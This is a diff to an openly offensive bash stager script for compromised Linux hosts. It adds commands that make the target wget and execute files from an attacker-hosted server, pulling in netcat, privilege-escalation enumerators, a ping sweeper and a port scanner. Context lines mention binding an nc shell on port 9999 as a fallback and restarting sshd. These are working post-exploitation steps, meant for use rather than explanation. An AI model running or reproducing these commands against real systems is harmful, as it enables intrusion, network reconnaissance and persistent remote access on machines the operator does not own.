@@ -6,7 +6,7 @@
 #
 # If the target is only able to connect back to you download, use the below
 # steps: 
-# 1: Host Machine:   cd /tmp/ && git clone https://github.com/WillChaos/OFFSEC.git && cd OFFSEC/PrivEsc/ && python -m SimpleHTTPServer 81
+# 1: Host Machine:   cd /tmp/ && git clone https://github.com/WillChaos/OFFSEC.git && cd OFFSEC && python -m SimpleHTTPServer 81
 # 2: Target Machine: cd /tmp/ && wget http://<hostIP>:81/LinuxStager.sh && chmod +x LinuxStager.sh && ./LinuxStager.sh http://<hostIP>:81/
 # ---------------------------------------------------------------------------------------------------------------------------------
 
@@ -24,19 +24,28 @@ if [ -z "$1" ]
   echo "[]_________________________________________________________________________________________[]"
   sleep 2s
   
+  echo "-----------------------------------------File stage section ---------------------------------"
   # download NC
   echo "[*] Downloading NC to: /tmp/ + making executable"
-  wget $1nc -O /tmp/nc && chmod +x /tmp/nc
-
+  wget $1/PrivEsc/nc -O /tmp/nc && chmod +x /tmp/nc
 
   # download linenum.sh
   echo "[*] Downloading linenum.sh to: /tmp/ + making executable"
-  wget $1LinEnum.sh -O /tmp/linenum.sh && chmod +x /tmp/linenum.sh
-
+  wget $1/PrivEsc/LinEnum.sh -O /tmp/linenum.sh && chmod +x /tmp/linenum.sh
 
   # download LinxPrivChecker.py
   echo "[*] Downloading LinuxPrivChecker.sh to: /tmp/ + making executable"
-  wget $1linuxprivchecker.py -O /tmp/LPC.py
+  wget $1/PrivEsc/linuxprivchecker.py -O /tmp/LPC.py
+  
+  # download pingSweeper.sh
+  echo "[*] Downloading pingSweep.sh to: /tmp/ + making executable"
+  wget $1/Tools/pingSweep.sh -O /tmp/pingSweep.sh
+  
+  # download ncPortScanner.sh
+  echo "[*] Downloading ncPortScanner.sh to: /tmp/ + making executable"
+  wget $1/Tools/ncPortScan.sh -O /tmp/ncPortScan.sh
+  
+  echo "--------------------------------------Config staging section ---------------------------------"
 
   # build a NC bind shell incase we lose a shell
   echo "[*] Attempting to bind a shell to 9999 incase you lose your shell (not reliable - sometimes works)"
@@ -74,7 +83,6 @@ if [ -z "$1" ]
   echo "-[*] detecting which ports ssh is availble on"
       service sshd restart
       netstat -tpln | egrep '(Proto|ssh)'
-
 
 
   # semi interactive shell
